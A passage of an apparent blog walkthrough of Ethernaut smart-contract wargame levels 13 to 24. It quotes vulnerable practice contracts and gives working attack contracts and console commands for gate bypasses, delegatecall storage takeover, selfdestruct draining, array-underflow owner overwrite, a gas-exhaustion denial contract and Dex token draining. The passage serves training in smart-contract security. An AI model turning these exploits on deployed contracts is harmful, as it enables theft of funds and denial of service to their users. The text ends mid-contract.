The left hand side of the require statement, converts the `_gateKey` into 4 bytes, cutting of the 4 high-order bytes. The right hand side of the statement, takes the `tx.origin` address and converts it into 2 bytes, cutting of the 6 high-order bytes.
The test for equality looks like this then: `0xXXXXXXXX == 0x0000XXXX.`

That works pretty well with the format we got after the second require statement, which was `0xXXXXXXXX0000XXXX`. The additional information we learn is, that we need to use the `tx.origin` as our `_gateKey` and set bytes 2 and 3, counting from low-order up, to zero.


Time to craft our contract, don't you think?

```solidity
interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateCracker {
    function attack(address _contract) public {
        GatekeeperOne gko = GatekeeperOne(_contract);
        bytes8 key = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        for (uint i = 0; i < 8191; i++) {
            (bool success, ) = _contract.call{gas: 800000 + i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                break;
            }
        }
        
    }
}
```

Deploy and call the `attack()` function with the address of the GatekeeperOne contract. The contract is going to call the `enter()` function of the GatekeeperOne contract with the correct `_gateKey` and we pass all gates.

### Learning

Not sure to be honest :D It takes time, but still can be cracked, and there are multiple ways to
do it. The brute force approach is one of them, but it is not the most efficient one.

## Level 14: Gatekeeper Two <a name="level-14-gatekeeper-two"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
Let's get going :)

First gate - easy, we know that one already: proxy contract.

Second gate: `extcodesize(caller())` returns the size of a contract at a given address. `caller()` will return the address
of the one calling the account. That';'s apparently a Yul function. How do we overcome this gate check? `extcodesize` returns the
size of a deployed contract. If we write a contract which is in the process of deployment, `extcodesize` is going to return 0, since
the code has not been stored at the given address yet.

Last requirement statement:
`require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);`

Let's have a look into that, one by one

I believe that some mathematical law applies for XOR, which allows us to do the following:
`A XOR B = C => A XOR C = B and B XOR C = A`

For our requirement statement that means:

`uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max)`

`uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == type(uint64).max) ^ uint64(_gateKey)`

`type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == uint64(_gateKey)`

Time to craft our contract:

```solidity
interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateCrusherTwo {
    constructor(address _contract) {
        GatekeeperTwo got = GatekeeperTwo(_contract);
        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        got.enter(_gateKey);
    }
}
```

There we go :)
Submit and you are done :)

### Learning
Nothing is safe from us :)

## Level 15: Naught Coin <a name="level-15-naught-coin"></a>

As always, let's have a look at the contract first:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```

We as a player own some tokens but they are locked :/ for 10 years. We need to find a way to unlock them
and dump those on the market...

The contract inherits from the ERC20 contract. We see that the coder wrote their
own `transfer` function and added a modifier to it, which checks whether the
`msg.sender` is the player and if the current block timestamp is greater than
the `timeLock`. If that is the case, the transfer is allowed. If not, the transfer
is not allowed.

See you in 10 years :)

Nah, jokes aside. Let's get our tokens unlocked in the next 2 minutes (if the block time
allows it :D).

The coder inherits from ERC20 but forgets that the `transferFrom` transaction exists.
The `transferFrom` transaction allows us to transfer tokens from another address to
another address. The `transferFrom` transaction is not protected by the `lockTokens`
modifier and we can use it to transfer the tokens from the player to another address.
It also requires an approval from the player, which we can get by calling the `approve`
function of the ERC20 contract.

Here is the code to unlock the tokens - you can run it in the browser console:

```javascript
await contract.balanceOf(player).then(v => v.toString())
await contract.approve(player, '1000000000000000000000000')
await contract.allowance(player, player).then(v => v.toString()) // wait till this is > 0
// once allowance > 0
await contract.transferFrom(player, "some address", '1000000000000000000000000')
```

and you are done :)

You could also use a different address during the `approve` call and then transfer the tokens
to that address. But I was to lazy to switch accounts in MetaMask and find some work around
for the instance address, bla bla bla.

That was easier :)

### Learning

Always check the functions of the contract and the contracts you are inheriting from.
If the coder forgets to protect a function, you can use it to your advantage.

## Level 16: Preservation <a name="level-16-preservation"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

We see here, that the `Preservation` contract uses delegatecall to call the `setTime` function of the `LibraryContract` contract. The `LibraryContract` contract has a `storedTime` variable, which is set by the `setTime` function.

`delegatecall` means, that the code of the `LibraryContract` contract is executed in the context of the `Preservation` contract. That means, that the `LibraryContract` has access to the storage and functions of the `Preservation` contract.

What's the problem here? The storage mapping is wrongly defined in the `LibraryContract`. Instead of being located in the
2nd slot of the storage, it is located at the 0th slot. That means, that the `storedTime` variable of the `LibraryContract` is
overwriting the `timeZone1Library` variable of the `Preservation` contract.

We can use that to our advantage. We will deploy a contract which is going to implement a `setTime` function, which is going to 
overwrite the `owner` variable of the `Preservation` contract.

Let's get to it :)

Our contract:

```solidity
contract AttackDelegateCall {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
```

Deploy the contract and save the address of the contract. In the browser console call

```
await contract.setSecondTime("0xaddress of your deployed contract")
// wait to be included
await contract.setFirstTime(player)
//wait to be included
await contract.owner()
// your are owner :)
```

and you are done :)

### Learning

Delegatecall is a powerful tool, but it can also be dangerous. Always make sure that the storage of the contract you are calling is correctly defined.

## Level 17: Recovery <a name="level-17-recovery"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

We have a factory contract, which deploys `SimpleToken` contracts :) Nice, isn't it?

According to the description of the level, someone wrote the contracts, deployed it,
generated a token contract, send `0.001` Eth to the `SimpleToken` contract, and
forgot the address - dang it.

Shit happens, but good that there are indexers :)

Let's request a new instance and put the new instance address into an explorer.
Since those levels can be played on different networks, you have to pick the right one :)

I am doing it on Holesky, so `holesky.etherscan.io` it is.

After putting the instance address into the explorer, we see the contract has no
transactions. Let's switch to the `Internal Transactions` tab and see what is going
on there. We can see that there had been 3 internal transactions, 2 of them
created a contract.

If we inspect those newly created contracts, we can see that one of those is our
contract with the instance address, and a second one. Go to the second contract
and check the balance. There we go, the second token contract has a balance of
`0.001` Eth.

Time for recovery: :helicoper flying:

We see that the contract has a `destory` function, which is not protected, calling
the `selfdestruct` command. The `selfdestruct` command takes an address to where
to send a remaining balance of the contract to. We can call the `destroy` function
and provide our address as parameter. The remaining balance of the contract is going
to be sent to our address.

Copy the `SimpleToken` contract code to Remix, select `Injected Provider`, copy
the address of the contract and load the contract using the `At Address` button.

Now you are able to call the `destroy` function and provide your address as parameter.

Congratulations, you got `0.001` Eth :)

### Learning

My learning: No secrets in blockchain. Even you can't find the address, you can use an explorer
to find transactions and internal transactions. And always check the contract code, you never know
what you can find there.

Learning from the level:

> Contract addresses are deterministic and are calculated by keccak256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

>Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

## Level 18: Magic Number  <a name="level-18-magic-number"></a>

Let's have a look at this interesting level :)

We have to deploy a contract which will be called by Ethernaut and it has to
return the magic number - the meaning of life - 42. Easy, right?

There is a catch - the contract code has to be very tiny, no more than 10 opcodes.

For this we need to know how Smart Contracts are deployed.

Whenever you write a Smart Contract and use the compiler into bytecode, the code
consists of two parts: the initialization code and the runtime code.

The initialization code is the code which is executed when you deploy a contract.
It copies the runtime code at a deterministic address and runs the code within
the `constructor` function.

Once the deployment code has been deployed, the runtime code is located at a 
address and can be called anytime.

What that means for us is, that we have to write the deployment code and runtime
code.

Let's start with the runtime code. We need to return the magic number 42. The
opcode for returning a value is `PUSH1 0x2a` and `RETURN`. The `0x2a` is the
hexadecimal representation of the number 42.

```solidity
PUSH1 0x2A PUSH1 0x00 MSTORE // store 42 in memory at position 0
PUSH1 0x20 PUSH1 0x00 RETURN // return 32 bytes from memory at position 0
```

This translates to the following bytecode:

```
0x602a60005260206000f3
```

where 0x60 is `PUSH1`, `0x52` is `MSTORE`, and `0xf3` is `RETURN`.

Now time for our deployment code.

```solidity
PUSH1 0x0A      // 10 bytes is the length of the contract to be copied - 2 bytes
PUSH1 0x0C      // starting byte (at byte 16) of the contract, because it comes after this code - 2 bytes
PUSH1 0x0       // Offset in memory - 2 bytes
CODECOPY        // Put the contract below into memory - 1 byte
PUSH1 0x0A      // length of the contract below that's now stored in memory - 2 bytes
PUSH1 0x0       // Offset in memory of the contract below - 2 bytes 
RETURN          // Returning the contract - 1 byte
```

This translates to the following bytecode:

```solidity
0x600A600C600039600A6000F3
```

Let's combine both of them in the following manner:

```
// deployer code + runtime code
0x600A600C600039600A6000F3 + 0x602a60005260206000f3
0x600A600C600039600A6000F3602a60005260206000f3
```

Deploy the contract using the following code from the Ethernaut console:

```javascript
await web3.eth.sendTransaction({from: player, data: '600A600C600039600A6000F3602a60005260206000f3'})
```

get the contract address and set it for the level.

```javascript
await contract.setSolver("contract code")
```

and you are done :)

### Learning

You do not need always Solidity ;)


## Level 19: Alien Codex <a name="level-19-alien-codex"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
```

Our objective is to become the owner of the contract.

Important to notice is that Solidity 0.5.0 is used. Solidity allowed to modify
length of an array, which I believe has been changed from version 6 onwards.

Could this become a problem? Let's see.

Let's first inspect the storage of the contract. Run the following commands
in the browser console:

```javascript
await web3.eth.getStorageAt(contract.address, 0) // owner + contact
await web3.eth.getStorageAt(contract.address, 1) // 
```

to verify that we mapped the variables correctly, let's call some functions
of the contract:

```javascript
await contract.makeContact()
await contract.record("0x000000000000000000000001f2531ff8b7ec8886ce5b48b05ab7894d25ff4bf8")
```

Let's get the storage slots again:
    
```javascript
await web3.eth.getStorageAt(contract.address, 0) // owner + contact
await web3.eth.getStorageAt(contract.address, 1) // codex
```

Storage slot 0 should now have a 1 before the owner address. That means, that the
`contact` variable is set to true.
Storage slot 1 should now have a 1, which represents the length of the `codex` array.

Good :)

Let's call the `retract` function and see what happens:

```javascript
await contract.retract()
await web3.eth.getStorageAt(contract.address, 1) // codex should give 0
await contract.retract()
await web3.eth.getStorageAt(contract.address, 1) // codex should give 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```
Wow, what the hell. The length of the `codex` array is now `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`.
That means we are able to write to the storage anywhere we want :O

But how?

For this we need to understand how the storage layout works for dynamic arrays.
In the code we can see, that contract `owner` and `contact` are sharing slot 0,
since both fit in there together. The length of the `codex` array is stored in
slot 1. To get the first entry of the `codex` array, we need to calculate the
storage slot for the first entry. The first entry is stored at `keccak256(1)`,
where 1 is the storage slot. The second entry of the `codex` array is stored at
`keccak256(1) + 1`, and so on.

Equipped with that knowledge, we can now write to the storage of the contract
and set the owner to our address.

To see that in action, run the following commands:

```javascript
await contract.record("0xDEADBEEF")
```
Calculate the slot where the data is stored:

```javascript
storage_slot = web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')
await web3.eth.getStorageAt(contract.address, storage_slot)
```
and you should see the data you just stored.

Let's get back on how to set the owner to our address. Let's set the length of the
array back to `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`:

```javascript
await contract.retract() // do until the length is 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
```

We can see in the provided contract, that it has a `revise` function, which allows
us to set the content of the `codex` array at a specific index. We can use that
to set the owner to our address.

We know that our array data starts at `web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')`
and we know that the storage of a contract has `2 ** 256` slots (don't get mistaken -
thats a really huge number). 
Let's calculate the difference between the `(2 ** 256) - web3.utils.sha3('0x0000000000000000000000000000000000000000000000000000000000000001')`
which will give us the index of storage slot 0.

Why 0 you might ask. The storage has `2 ** 256` slots, but since we start counting
from 0, the last slot is `2 ** 256 - 1`. `2 ** 256` is slot 0 again, overflow.

Let's calculate the difference:

```bash
python3 -c 'print(0x010000000000000000000000000000000000000000000000000000000000000000 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)'
```
and we get a number: `35707666377435648211887908874984608119992236509074197713628505308453184860937`

That's the index in order to write into slot 0.

In the beginning we made the observation, that slot 0 contains the owner and the
contact variable. Let's overwrite it now :)

```javascript
await web3.eth.getStorageAt(contract.address, 0) // to see the current value
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x' + web3.utils.padLeft(player.replace('0x', ''), 64))
await web3.eth.getStorageAt(contract.address, 0) // to see the new value
await contract.owner() // you should be the owner now
```

Nice :)

### Learning

It is important to check which Solidity compiler is being used and what the
differences are between the versions. Each version gets better and mitigates
vulnerabilities/weaknesses of the previous versions.

## Level 20: Denial <a name="level-20-denial"></a>

First let's have a look at the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

Our goal in this level is to make sure that the owner is not able to withdraw
their share of the funds.

I am not sure how you feel, but I think after doing all the other levels, this
should be rather straight forward.

We can set the partner address by call the `setWithdrawPartner` function.

Having a closer look at the `withdraw` function, we can see that the contract
uses `call` to send the funds to the partner. The `call` function does not check
the return value of the function call. That means, that if the partner reverts
the transaction, the owner is still going to get their share.
But the `call` function is not limited by gas, instead the entire gas of the
transactions is forwarded to the partner contract, which means that the partner can
use all the gas to revert the transaction and the owner is not going to get their
share.

Let's do it :)

Our `partner` contract is going to look like this:

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract Drain {
    receive() external payable {
        while(true){}
    }
}
```

Deploy the contract and set the address of the contract as the partner address
of the `Denial` contract.

```javascript
await contract.setWithdrawPartner("0xaddress of the partner contract")
```

and you are done :)

### Learning

The `call` function is a powerful tool, but it can also be dangerous. Always
make sure to check the return value of the function call and limit the gas
forwarded to the function.

## Level 21: Shop <a name="level-21-shop"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

Our objective is to buy the object at a lower price than the current price.

The contract has a `price` variable, which is set to 100. The contract has a `buy`
function, which checks whether the price of the buyer is greater or equal to the
price of the object and whether the object has already been sold. If both conditions
are met, the object is sold and the price of the object is set to the price of the
buyer.

The contract uses an interface `Buyer`, which has a `price` function. The buyer
contract has to implement the `price` function. Important to note: it has the
`view` modifier, which means that the function does not change the state of the
contract.

Let's do it :)

Here is our contract:

```solidity
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {

    function buyFromShop(address _shop) public {
        IShop(_shop).buy();
    }

    function price() external view returns (uint256) {
        return IShop(msg.sender).isSold() ? 0 : 100;
    }
}
```

Deploy the `Buyer` contract and call the `buyFromShop()` function with the
Shop instance address. Your contract does the rest :)

### Learning

For the love of christ - do not trust any contract. The shop calls the
`price` function of the buyer contract twice and trusts the return value.
There is nothing which prevents the `Buyer` contract to change its data
between calls.

## Level 22: Dex <a name="level-22-dex"></a>

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

We have a Dex, where the Dex contract has 100 tokens of each token. We, as the
player have 10 tokens of each token. Our goal to reduce either one of the tokens
of the DEX to 0.

How does the Dex contract calculate the swap price? The Dex contract calculates
the swap price by multiplying the amount of the token to be swapped with the
balance of the token to be received and divides it by the balance of the token
to be swapped. You can see that in the `getSwapPrice` function.

You can see in the `getSwapPrice` function, that division is used. The problem
with division is in Solidity is that it rounds towards [zero](https://docs.soliditylang.org/en/latest/types.html#division).

Let's just play a bit with the `getSwapPrice` calculation on paper:

Here is our initial state:

```
     player     |      DEX
token1 - token2 | token1 - token2
----------------------------------
  10      10    |   100     100
```

Let's say we want to swap 10 tokens of token1 to token2. The calculation
gives us the following:

```
     player     |      DEX
token1 - token2 | token1 - token2
----------------------------------
  10      10    |   100     100
   0      20    |   110     90
```

Now let's swap back 20 tokens of token2 to token1:

```
     player     |      DEX
token1 - token2 | token1 - token2
----------------------------------
  10      10    |   100     100
   0      20    |   110     90
  24       0    |    86     110
```

Let's do it again by swapping 24 tokens of token1 to token2:

```
     player     |      DEX
token1 - token2 | token1 - token2
----------------------------------
  10      10    |   100     100
   0      20    |   110      90
  24       0    |    86     110
   0      30    |   110      80
```
We can see that our stake is raising with each swap and that the stake of the 
Dex is decreasing. We can continue this process until the Dex has no tokens left.

```
     player     |      DEX
token1 - token2 | token1 - token2
----------------------------------
  10      10    |   100     100
   0      20    |   110      90
  24       0    |    86     110
   0      30    |   110      80
  41       0    |    69     110
   0      65    |   110      45
```

We now own 65 tokens of token2 which is more than enough to drain the Dex of
token1 tokens. Let's see the calculation:

```
65 * 110 / 45 = 158
```
The Dex does not have 158 tokens of token1. Let's see how many tokens of token1
we need to actually swap in order to drain the Dex of tokens1.

```
110 = X * 110 / 45 => X = 45
```

That means we just need to swap 45 tokens of token1 in order to drain the Dex.

Let's do it :)
Run just the following commands in the terminal until the Dex has no tokens left:

```javascript
await contract.swap(await contract.token1(), await contract.token2(), 10)
await contract.swap(await contract.token2(), await contract.token1(), 20)
... and so on
```
And you are done :)

### Learning

Division in Solidity rounds towards zero. Always be aware of that when you are
doing calculations with division.

Learning from the level itself:

>The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.
>
>You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the wrong price.
>
>The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset's price in case a specific dex is targeted by an attack like this.
>
>Oracles are used to get data into and out of smart contracts.
>
>Chainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.

## Level 23: Dex2 <a name="level-23-dex-2">

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}
```

in the previous Dex level, we had to reduce the token amount of the Dex contract
of one token, either token1 or token2. In this level, we have to reduce the
token amount of both tokens to 0.

We can see that the Dex contracts `swap` function is a bit different - it doesn't
check the addresses of the provided contracts. That means we can swap any token
with any other token. Let's make use of that problem :)

We write our own token contract, which is going to be used to drain the Dex:

Our contract:

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";


contract AttackerTokenr is ERC20 {

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _mint(dexInstance, initialSupply);
    }
}
```

Deploy the contract and set the address of the contract as the Dex instance address.

You will have to approve the dex instance to spend your tokens. You can do that
by calling the `approve` function of your deployed contract. I used Remix,
so that makes it rather easy :)

If we swap 100 from our freshly created tokens against token1, based on the
calculation of the `getSwapAmount` function, we should get 100 tokens of token1
in return. So let's do that :)

```javascript
await contract.swap("<your contract address>", await contract.token1(), 100)
```

Now we have those 100 tokens of the Dex :) 

You have now 2 options to move forward: Either we continue to use our deployed
contract to drain the Dex of token2 tokens, or we deploy it new and perform the
same attack.

I decided to reuse the same contract, and reminted the tokens, so thatI have the
amout of tokens as the Dex has token2 tokens.

Then we do it again:

```javascript
await contract.swap("<your contract address>", await contract.token2(), 100)
```

And you are done :)

### Learning

Taken from the level itself:

>As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.
>
>Just because a contract claims to implement the ERC20 spec does not mean it's trust worthy.
>
>Some tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.
>
>Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.
>
>If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.

## Level 24: Puzzle Wallet <a name="level-24-puzzle-wallet"></a>

Another day another level :) 

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData)
        UpgradeableProxy(_implementation, _initData)
    {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success,) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

